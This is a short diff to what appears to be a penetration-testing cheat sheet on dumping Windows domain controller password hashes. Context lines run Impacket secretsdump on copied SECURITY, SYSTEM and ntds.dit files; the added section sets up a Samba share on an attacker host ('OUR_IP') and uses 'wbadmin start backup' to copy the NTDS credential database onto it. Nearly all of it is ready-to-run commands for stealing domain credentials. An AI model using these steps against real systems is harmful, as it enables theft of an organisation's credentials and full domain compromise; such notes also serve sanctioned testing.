@@ -13,3 +13,17 @@
 #### 2) Transfer them to attacking machine
 
 #### 3) python3 Impacket-Secretsdump.py -security /path/to/SECURITY -system /path/to/SYSTEM -ntds path/to/ntds.dit local
+
+# DUMP DOMAIN CONTROLLER HASHES WITH WBADMIN
+
+#### 1) Create an new user that maches the "force user" parameter in the /etc/samba/smb.conf file:
+
+#### adduser smbuser
+
+#### smbpasswd -a smbuser
+
+#### sudo service smbd restart 
+
+#### 2) net use k: \\OUR_IP\SHARE /user:smbuser smbpass (Mount the share)
+
+#### 3) echo "Y" | wbadmin start backup -backuptarget:\\OUR_IP\SHARE -include:c:\windows\ntds (Backup NTDS file)
